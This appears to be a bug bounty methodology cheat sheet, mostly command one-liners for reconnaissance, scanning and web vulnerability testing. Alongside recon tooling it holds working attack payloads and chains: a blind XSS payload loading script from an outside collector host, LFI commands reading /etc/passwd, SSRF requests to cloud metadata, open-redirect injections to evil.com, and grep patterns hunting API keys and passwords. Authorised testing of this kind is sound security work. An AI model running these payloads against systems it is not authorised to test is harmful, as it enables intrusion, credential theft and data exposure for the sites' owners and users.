Finding Subdomains
The first step in my process is to gather as many subdomains of the target as possible using various sources. Below are some of the tools and commands I use for comprehensive subdomain enumeration.

Automated Enumeration with Tools
subfinder -d example.com -all -recursive -o subfinder.txt
assetfinder --subs-only example.com > assetfinder.txt
findomain -t target.com | tee findomain.txt
amass enum -passive -d example.com | cut -d']' -f 2 | awk '{print $1}' | sort -u > amass.txt
amass enum -active -d example.com | cut -d']' -f 2 | awk '{print $1}' | sort -u > amass.txt
Make sure to configure and provide all necessary API keys for each data source so the tools can access their full range of information and deliver more comprehensive results.

Public Sources (Manual/Custom)
You can also directly fetch subdomains from public sources using curl tool, which is especially useful for manual reconnaissance. Public sources can reveal subdomains missed by automated tools.
curl -s https://crt.sh\?q\=\domain.com\&output\=json | jq -r '.[].name_value' | grep -Po '(\w+\.\w+\.\w+)$' >crtsh.txt
curl -s "http://web.archive.org/cdx/search/cdx?url=*.hackerone.com/*&output=text&fl=original&collapse=urlkey" |sort| sed -e 's_https*://__' -e "s/\/.*//" -e 's/:.*//' -e 's/^www\.//' | sort -u > wayback.txt
curl -s "https://www.virustotal.com/vtapi/v2/domain/report?apikey=[api-key]&domain=www.nasa.gov" | jq -r '.domain_siblings[]' >virustotal.txt

GitHub Subdomain Scraping
Another solid technique is using the GitHub Subdomains tool. It scrapes subdomains from public GitHub repositories of organizations or users. Make sure to use a GitHub API key to avoid rate-limiting issues.
github-subdomains -d domain.com -t [github_token]

Merging & Deduplication
Next, combine all the subdomain files into a single organized list and eliminate duplicates using the following command:
cat *.txt | sort -u > final.txt

Subdomain Permutation & DNS Resolution
You can create subdomain variations by generating patterns based on the existing ones.
subfinder -d domain.com | alterx | dnsx
echo doamin.com | alterx -enrich | dnsx
echo doamin.com | alterx -pp word=/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt | dnsx
This will generate all possible permutations of the given domain that might not be found through other sources. It then resolves them and returns only the live active subdomains using dnsx tool.

Brute-force Subdomains Using FFUF
You can also use ffuf for subdomain brute-forcing. it tests each word from the wordlist against the target domain to identify valid subdomains.
ffuf -u "https://FUZZ.target.com" -w wordlist.txt -mc 200,301,302

Discover Hosts via IP Address and ASN Mapping
You can use AS (Autonomous System) mapping to discover a wide range of IP addresses associated with a domain. This helps uncover additional infrastructure related to the target.

ASN & IP Discovery
asnmap -d domain.com | dnsx -silent -resp-only
This will retrieve all IP addresses associated with the specified ASN and resolve them to reveal the active IPs within its CIDR range.

Discovering Assets with Amass
After enumerating subdomains, a great way to expand your attack surface is by identifying related infrastructure owned by the target organization. This includes discovering additional domains, IP ranges and subdomains associated with the company. The amass intel module is perfect for this task.
amass intel -org "nasa"
amass intel -active -cidr 159.69.129.82/32
amass intel -active -asn [asnno]
these commands help you map out the organization’s digital footprint based on organization names, IP ranges (CIDRs) and ASNs (Autonomous System Numbers).

Harvesting IP Addresses Linked to Domains
This section covers multiple techniques to extract IP addresses linked to domains using public APIs, historical data and search engines. helping you uncover backend infrastructure and allowing you to resolve and test each IP for active services.
curl -s "https://www.virustotal.com/vtapi/v2/domain/report?domain=<DOMAIN>&apikey=[api-key]" | jq -r '.. | .ip_address? // empty' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}'
curl -s "https://otx.alienvault.com/api/v1/indicators/hostname/<DOMAIN>/url_list?limit=500&page=1" | jq -r '.url_list[]?.result?.urlworker?.ip // empty' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}'
curl -s "https://urlscan.io/api/v1/search/?q=domain:<DOMAIN>&size=10000" | jq -r '.results[]?.page?.ip // empty' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}'
shodan search Ssl.cert.subject.CN:"<DOMAIN>" 200 --fields ip_str | httpx-toolkit -sc -title -server -td

Discover Live Hosts
After gathering a large number of subdomains and IPs from various sources, the next step is to filter out the live and accessible ones using the httpx-toolkit.
cat subdomain.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt
This command actively probes the discovered subdomains across a set of specified ports to identify responsive hosts. Since httpx targets only default ports by default, so it’s important to manually specify additional frequently used ports for broader coverage. and Using 200 threads significantly speeds up the scanning process when dealing with a large number of subdomains.

Visual Recon with Aquatone
Once you have a list of live domains, tools like Aquatone help you take recon to the next level by capturing visual screenshots of each site’s homepage. This gives you a quick overview of your targets, helping you spot login pages, admin panels, staging environments and more all at a glance.
cat hosts.txt | aquatone
cat hosts.txt | aquatone -ports 80,443,8000,8080,8443
cat hosts.txt | aquatone -ports 80,81,443,591,2082,2087,2095,2096,3000,8000,8001,8008,8080,8083,8443,8834,8888

URL Collection and Analysis
Once we have live subdomains, we need to discover URLs and endpoints from active/passive sources using various tools:

Active Crawling
katana -u livesubdomains.txt -d 2 -o urls.txt
cat urls.txt | hakrawler -u > urls3.txt

Passive Crawling
cat livesubdomains.txt | gau | sort -u > urls2.txt
urlfinder -d tesla.com | sort -u >urls3.txt
echo example.com | gau --mc 200 | urldedupe >urls.txt

Param Extraction
Once you’ve collected a large list of URLs during recon, the next step is to extract only those URLs that contain parameters. ideal targets for testing vulnerabilities like XSS, SQLi, Open Redirect and for running Nuclei DAST templates.
cat allurls.txt | grep '=' | urldedupe | tee output.txt
or:
cat allurls.txt | grep -E '\?[^=]+=.+$' | tee output.txt

Parameter Discovery Using gf Patterns
gf (Gf-Patterns) is a powerful tool that helps you filter URLs based on patterns commonly associated with vulnerabilities like XSS, SQLi, LFI, SSRF, Open Redirect and more. By using predefined or custom patterns, you can quickly extract high-priority URLs from large recon files. making your workflow faster and more targeted for example:
cat allurls.txt | gf sqli

Nuclei: Automate Your Vulnerability Discovery
Nuclei is a powerful, fast and flexible tool for automated vulnerability scanning. It uses a template-based engine to scan URLs for known misconfigurations, CVEs, exposures and more making it ideal for both recon and active testing in bug bounty hunting or pentesting workflows.
nuclei -u https://target.com -bs 50 -c 30
nuclei -l live_domains.txt -bs 50 -c 30
Use the batch size flag to set how many templates to run at once, and the concurrency flag to define how many domains to scan simultaneously. This massively speeds up the process and helps you detect known issues quickly.

Sensitive File Discovery
From the collected URLs, we can identify potentially sensitive files (e.g., backups, config files, logs) that may lead to information disclosure vulnerabilities a common yet impactful bug category worth reporting.
cat allurls.txt | grep -E "\.xls|\.xml|\.xlsx|\.json|\.pdf|\.sql|\.doc|\.docx|\.pptx|\.txt|\.zip|\.tar\.gz|\.tgz|\.bak|\.7z|\.rar|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.gz|\.config|\.csv|\.yaml|\.md|\.md5"
cat allurls.txt | grep -E "\.(xls|xml|xlsx|json|pdf|sql|doc|docx|pptx|txt|zip|tar\.gz|tgz|bak|7z|rar|log|cache|secret|db|backup|yml|gz|config|csv|yaml|md|md5|tar|xz|7zip|p12|pem|key|crt|csr|sh|pl|py|java|class|jar|war|ear|sqlitedb|sqlite3|dbf|db3|accdb|mdb|sqlcipher|gitignore|env|ini|conf|properties|plist|cfg)$"
site:*.example.com (ext:doc OR ext:docx OR ext:odt OR ext:pdf OR ext:rtf OR ext:ppt OR ext:pptx OR ext:csv OR ext:xls OR ext:xlsx OR ext:txt OR ext:xml OR ext:json OR ext:zip OR ext:rar OR ext:md OR ext:log OR ext:bak OR ext:conf OR ext:sql)
This regex filters URLs that end with file extensions commonly associated with sensitive documents, configuration files, or backups, often a goldmine for information disclosure vulnerabilities.

Hidden Parameter Discovery
Uncovering undocumented GET/POST parameters can lead to serious vulnerabilities such as injections, IDORs or business logic bypasses. Here’s how you can discover them effectively:

Passive parameter discovery:
arjun -u https://site.com/endpoint.php -oT arjun_output.txt -t 10 --rate-limit 10 --passive -m GET,POST --headers "User-Agent: Mozilla/5.0"

Active parameter discovery with wordlist:
arjun -u https://site.com/endpoint.php -oT arjun_output.txt -m GET,POST -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -t 10 --rate-limit 10 --headers "User-Agent: Mozilla/5.0"
-oT sets the output format to text, -t 10 uses 10 threads, — rate-limit 10 limits to 10 requests per second, — passive enables passive discover and -m GET,POST tests both GET and POST methods.

Directory & File Bruteforcing
Reveal hidden directories and files by brute-forcing common paths and extensions a crucial technique to uncover admin panels, backups, development files or misconfigured endpoints that are not publicly linked but still accessible.

Using Dirsearch
dirsearch -u https://example.com --full-url --deep-recursive -r
dirsearch -u https://example.com -e php,cgi,htm,html,shtm,shtml,js,txt,bak,zip,old,conf,log,pl,asp,aspx,jsp,sql,db,sqlite,mdb,tar,gz,7z,rar,json,xml,yml,yaml,ini,java,py,rb,php3,php4,php5 --random-agent --recursive -R 3 -t 20 --exclude-status=404 --follow-redirects --delay=0.1

Using FFUF
ffuf -w seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u https://example.com/FUZZ -fc 400,401,402,403,404,429,500,501,502,503 -recursion -recursion-depth 2 -e .html,.php,.txt,.pdf,.js,.css,.zip,.bak,.old,.log,.json,.xml,.config,.env,.asp,.aspx,.jsp,.gz,.tar,.sql,.db -ac -c -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0" -H "X-Forwarded-For: 127.0.0.1" -H "X-Originating-IP: 127.0.0.1" -H "X-Forwarded-Host: localhost" -t 100 -r -o results.json

JavaScript File Discovery and Analysis
JavaScript files often contain valuable information such as hidden API endpoints, internal functions, parameter names, hardcoded credentials, tokens, even sensitive keys and Development comments and debugging information. Analyzing these files can give deep insight into the application’s logic and uncover attack surfaces that aren’t visible in the frontend.

JS file hunting:
echo example.com | katana -d 3 | grep -E "\.js$" | nuclei -t /home/coffinxp/nuclei-templates/http/exposures/ -c 30
cat jsfiles.txt | grep -r -E "aws_access_key|aws_secret_key|api key|passwd|pwd|heroku|slack|firebase|swagger|aws_secret_key|aws key|password|ftp password|jdbc|db|sql|secret jet|config|admin|pwd|json|gcp|htaccess|.env|ssh key|.git|access key|secret token|oauth_token|oauth_token_secret"
cat allurls.txt | grep -E "\.js$" | httpx-toolkit -mc 200 -content-type | grep -E "application/javascript|text/javascript" | cut -d' ' -f1 | xargs -I% curl -s % | grep -E "(API_KEY|api_key|apikey|secret|token|password)"

Bulk JS analysis:
echo domain.com | katana -ps -d 2 | grep -E "\.js$" | nuclei -t /nuclei-templates/http/exposures/ -c 30
cat alljs.txt | nuclei -t /home/coffinxp/nuclei-templates/http/exposures/

Content-Type Filtering
Filter content based on MIME types to identify JS or HTML pages for further analysis. This helps you focus on files that are most likely to contain valuable endpoints, parameters or client-side logic worth analyzing further.

HTML content Filtering
echo domain | gau | grep -Eo '(\/[^\/]+)\.(php|asp|aspx|jsp|jsf|cfm|pl|perl|cgi|htm|html)$' | httpx -status-code -mc 200 -content-type | grep -E 'text/html|application/xhtml+xml'

JavaScript content Filtering
echo domain | gau | grep '\.js$' | httpx -status-code -mc 200 -content-type | grep 'application/javascript'

WordPress Security Testing
If the target site runs on WordPress, enumerate users, plugins, themes and version details. This helps identify outdated components, misconfigurations and potential attack vectors such as vulnerable plugins or exposed admin panels.
wpscan --url https://site.com --disable-tls-checks --api-token <here> -e at -e ap -e u --enumerate ap --plugins-detection aggressive --force
-e at: Enumerate all themes
-e ap: Enumerate all plugins
-e u: Enumerate users
— plugins-detection aggressive: Aggressive plugin detection
— force: Force scan even if WordPress not detected

Network-Level Recon
Scan the target for open ports, running services and software versions. This helps you find vulnerable or misconfigured services that may not be visible from the web interface.

Port Scanning with Naabu
naabu -list ip.txt -c 50 -nmap-cli 'nmap -sV -SC' -o naabu-full.txt

Nmap full scan
nmap -p- --min-rate 1000 -T4 -A target.com -oA fullscan

Masscan for speed
masscan -p0-65535 target.com --rate 100000 -oG masscan-results.txt

Vulnerability Discovery
After collecting all domains and URLs, it’s time to move from information gathering to actual testing. This is where recon meets exploitation. Now use the data you’ve collected to start testing for real vulnerabilities using different tools and techniques.

SQL Injection Testing
SQL Injection is still one of the most dangerous and impactful web vulnerabilities. Here’s a practical approach to identify and exploit it effectively.
for possible SQL technology detection:
subfinder -dL subdomains.txt -all -silent | httpx-toolkit -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'
for single domain:
subfinder -d http://example.com -all -silent | httpx-toolkit -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'
This command will filter out URLs using technologies and patterns that are commonly vulnerable to SQL injection, helping you prioritize high-risk targets for testing.
for possible SQL Endpoints:
echo http://site.com | gau | uro | grep -E ".php|.asp|.aspx|.jspx|.jsp" | grep -E '\?[^=]+=.+$'
This command filters URLs with extensions commonly linked to SQL injection vulnerabilities.

Cross-Site Scripting (XSS) Testing
XSS is a common and dangerous vulnerability that lets attackers inject malicious scripts into web pages, leading to session hijacking, redirects or defacement. Start with these one-liners for quick detection, then move on to advanced techniques like blind XSS and parameter fuzzing for deeper testing.
echo "target.com" | gau | gf xss | uro | httpx -silent | Gxss -p Rxss | dalfox
echo "example.com" | gau | qsreplace '<sCript>confirm(1)</sCript>' | xsschecker -match '<sCript>confirm(1)</sCript>' -vuln
echo https://example.com/ | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt
cat xss_output.txt | grep -oP '^URL: \K\S+' | sed 's/=.*/=/' | sort -u > final.txt

XSS Testing Using FFUF Request Mode
ffuf -request xss -request-proto https -w /root/wordlists/xss-payloads.txt -c -mr "<script>alert('XSS')</script>"

Blind XSS Testing
cat urls.txt | grep -E "(login|signup|register|forgot|password|reset)" | httpx -silent | nuclei -t nuclei-templates/vulnerabilities/xss/ -severity critical,high
subfinder -d example.com | gau | bxss -payload '"><script src=https://xss.report/c/coffinxp></script>' -header "X-Forwarded-For"
subfinder -d example.com | gau | grep "&" | bxss -appendMode -payload '"><script src=https://xss.report/c/coffinxp></script>' -parameters
cat xss_params.txt | dalfox pipe --blind https://your-collaborator-url --waf-bypass --silence

Local File Inclusion (LFI) Testing
Local File Inclusion (LFI) is a vulnerability that lets attackers include and read files from the server such as /etc/passwd, log files or configuration files. It can lead to sensitive data exposure, code execution or even full system compromise. Use the following one-liners to automate LFI detection and fuzz for vulnerable parameters.

Automated LFI discovery:
nuclei -l subs.txt -t /root/nuclei-templates/http/vulnerabilities/generic/generic-linux-lfi.yaml -c 30
echo "https://example.com/" | gau | gf lfi | uro | sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | xargs -I{} ffuf -u {} -w payloads/lfi.txt -c -mr "root:(x|\*|\$[^\:]*):0:0:" -v
gau target.com | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'

Alternative LFI method:
echo 'https://example.com/index.php?page=' | httpx-toolkit -paths payloads/lfi.txt -threads 50 -random-agent -mc 200 -mr "root:(x|\*|\$[^\:]*):0:0:"

LFI testing Using FFUF Request Mode
ffuf -request lfi -request-proto https -w /root/wordlists/offensive\ payloads/LFI\ payload.txt -c -mr "root:"

CORS (Cross-Origin Resource Sharing) Testing
Misconfigured CORS policies can allow unauthorized domains to access sensitive data or perform privileged actions across origins potentially leading to serious security issues like account takeover or data theft. This section covers both manual and automated methods to detect insecure CORS configurations.

Manual CORS testing using curl
curl -H "Origin: http://example.com" -I https://domain.com/wp-json/

Detailed CORS analysis
curl -H "Origin: http://example.com" -I https://domain.com/wp-json/ | grep -i -e "access-control-allow-origin" -e "access-control-allow-methods" -e "access-control-allow-credentials"

Automated CORS testing:
cat example.coms.txt | httpx -silent | nuclei -t nuclei-templates/vulnerabilities/cors/ -o cors_results.txt
python3 corsy.py -i subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked"
python3 CORScanner.py -u https://example.com -d -t 10

Subdomain Takeover Detection
Subdomain takeover occurs when a subdomain points to an external service (like GitHub Pages, Heroku or S3) that is no longer claimed allowing attackers to hijack it. Tools like subzy can automate the detection process by checking for takeover signatures across multiple providers.
subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl
This tool checks for subdomain takeover vulnerabilities by:
Testing multiple service providers
Verifying SSL certificates
Using high concurrency for speed
Hiding failed attempts to reduce noise

Git Repository Disclosure
Exposed .git/ directories can leak sensitive information like source code, credentials and internal logic making them a high-severity issue. This command helps identify .git exposures by filtering valid URLs, probing for the .git/ path and checking for directory listings or exposed content.
cat domains.txt | grep "SUCCESS" | gf urls | httpx-toolkit -sc -server -cl -path "/.git/" -mc 200 -location -ms "Index of" -probe
This command:
Filters successful responses
Uses GF patterns to extract URLs
Tests for .git/ directory exposure
Looks for “Index of” in responses
Checks for directory listing

SSRF Testing & Exploitation
Server-Side Request Forgery (SSRF) is a powerful vulnerability that allows attackers to make the server initiate requests to internal or external resources. This can lead to sensitive data exposure, cloud metadata access, internal port scanning or even remote code execution when chained properly.

Look for common SSRF-prone parameters in URLs
cat urls.txt | grep -E 'url=|uri=|redirect=|next=|data=|path=|dest=|proxy=|file=|img=|out=|continue=' | sort -u
Look for API/webhook integrations or cloud metadata patterns
cat urls.txt | grep -i 'webhook\|callback\|upload\|fetch\|import\|api' | sort -u
Nuclei for automated scanning
cat urls.txt | nuclei -t nuclei-templates/vulnerabilities/ssrf/
Basic SSRF to local services
curl "https://target.com/page?url=http://127.0.0.1:80/"
Target internal cloud metadata
curl "https://target.com/api?endpoint=http://169.254.169.254/latest/meta-data/"
Bypass filters with alternative IP formats
http://127.0.0.1%23.google.com
http://127.1
http://[::1]/
http://0x7f000001
http://017700000001
DNS rebinding or callback for blind SSRF
curl "https://target.com/page?url=http://yourdomain.burpcollaborator.net"

Open Redirect testing
Open Redirect vulnerabilities allow attackers to redirect users to malicious sites using trusted domain links often used in phishing or session hijacking attacks. This section covers simple to advance methods to detect and test for open redirect issues in URLs and parameters.
cat final.txt | grep -Pi "returnUrl=|continue=|dest=|destination=|forward=|go=|goto=|login\?to=|login_url=|logout=|next=|next_page=|out=|g=|redir=|redirect=|redirect_to=|redirect_uri=|redirect_url=|return=|returnTo=|return_path=|return_to=|return_url=|rurl=|site=|target=|to=|uri=|url=|qurl=|rit_url=|jump=|jump_url=|originUrl=|origin=|Url=|desturl=|u=|Redirect=|location=|ReturnUrl=|redirect_url=|redirect_to=|forward_to=|forward_url=|destination_url=|jump_to=|go_to=|goto_url=|target_url=|redirect_link=" | tee redirect_params.txt
final.txt | gf redirect | uro | sort -u | tee redirect_params.txt
cat redirect_params.txt | qsreplace "https://evil.com" | httpx-toolkit -silent -fr -mr "evil.com"
subfinder -d vulnweb.com -all | httpx-toolkit -silent | gau | gf redirect | uro | qsreplace "https://evil.com" | httpx-toolkit -silent -fr -mr "evil.com"
cat redirect_params.txt | while read url; do cat loxs/payloads/or.txt | while read payload; do echo "$url" | qsreplace "$payload"; done; done | httpx-toolkit -silent -fr -mr "google.com"

Conclusion
This methodology offers a structured and proven approach to web application security testing, built on years of hands-on experience from the bug bounty community. While tools play a role, true success comes from understanding core technologies, thinking like an attacker and staying persistent through trial and error.
